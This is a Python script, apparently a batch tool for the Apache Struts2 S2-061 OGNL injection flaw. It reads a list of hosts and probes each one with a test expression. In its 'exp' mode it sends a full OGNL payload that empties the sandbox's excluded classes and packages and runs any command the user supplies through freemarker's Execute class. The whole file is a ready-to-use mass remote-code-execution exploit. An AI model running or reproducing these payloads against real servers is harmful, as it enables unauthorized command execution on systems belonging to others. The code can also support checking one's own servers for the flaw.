#!/usr/bin/python3

import sys
import requests
import platform
from bs4 import BeautifulSoup

#统一URL格式，以“/”结尾
def correct_url(host_file):
    with open(host_file, "r") as f:
        hosts = f.readlines();
        correct_urls = [];
        for host in hosts:
            if platform.system() == "Linux":
                host = host.strip("\n");
            if platform.system() == "Windows":
                host = host.strip("\r\n");
            if host.endswith("/"):
                correct_urls.append(host);
            else:
                correct_urls.append(host + "/");
    return correct_urls;

#使用漏洞复现中的EXP1验证漏洞是否存在
def vuln_detect(url):
    payload = "?id=%25%7b+%27test%27+%2b+(2000+%2b+20).toString()%7d";
    full_url = url + payload;
    try:
        r = requests.get(full_url);
        if "test2020" in r.text:
            return "True";
        else:
            return "False";
    except requests.exceptions.ConnectionError:
        return "connection error";
    except BaseException as e:
        return e;

#使用漏洞复现中的EXP5执行命令
def vuln_exp(url, command):
    payload = "?id=%25{(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).";
    payload += "(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).";
    payload += "(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).";
    payload += "(%23stackvalue%3d%23attr[%27struts.valueStack%27]).";
    payload += "(%23potats0.setBean(%23stackvalue)).";
    payload += "(%23context%3d%23potats0.get(%27context%27)).";
    payload += "(%23potats0.setBean(%23context)).";
    payload += "(%23sm%3d%23potats0.get(%27memberAccess%27)).";
    payload += "(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).";
    payload += "(%23potats0.setBean(%23sm)).";
    payload += "(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).";
    payload += "(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).";
    payload += "(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).";
    payload += "(%23cmd%3d{%27" + command + "%27}).";
    payload += "(%23res%3d%23exec.exec(%23cmd))}";
    full_url = url + payload;
    r = requests.get(full_url);
    html_doc = r.text;
    soup = BeautifulSoup(html_doc, features="lxml");
    a0 = soup.find_all("a")[0];
    a0_id = a0["id"];
    return a0_id.strip("\n");

def main():
    if (len(sys.argv) == 3) or (len(sys.argv) == 4):
        if (sys.argv[1] == "detect") or (sys.argv[1] == "exp"):
            if len(sys.argv) == 3:
                directive = sys.argv[1];
                host_file = sys.argv[2];
            elif len(sys.argv) == 4:
                directive = sys.argv[1];
                command = sys.argv[2];
                host_file = sys.argv[3];
        else:
            print("Usage: below example is from ubuntu");
            print("Usage: python3 s2-061-batch-detect-exp.py detect hosts.txt");
            print("Usage: python3 s2-061-batch-detect-exp.py exp whoami vulnerable.txt");
            exit();
    else:
        print("Usage: below example is from ubuntu");
        print("Usage: python3 s2-061-batch-detect-exp.py detect hosts.txt");
        print("Usage: python3 s2-061-batch-detect-exp.py exp whoami vulnerable.txt");
        exit();

    #统一URL格式，以“/”结尾
    correct_urls = correct_url(host_file);
    
    if directive == "detect":
        with open("vulnerable.txt", "w") as f0:
            for url in correct_urls:
                result = vuln_detect(url);
                if result == "True":
                    print(url + " is vulnerable");
                    if platform.system() == "Linux":
                        f0.write(url + "\n");
                    if platform.system() == "Windows":
                        f0.write(url + "\r\n");
                elif result == "False":
                    print(url + " is not vulnerable");
                else:
                    print(url + " " + result);
            print("The result has been output to the vulnerable.txt");
    elif directive == "exp":
        for url in correct_urls:
            result = vuln_exp(url, command);
            if result != "":
                print("The result of " + url + " for command '" + command + "' is:");
                print(result);
            else:
                print("Command execute failed!");

main();
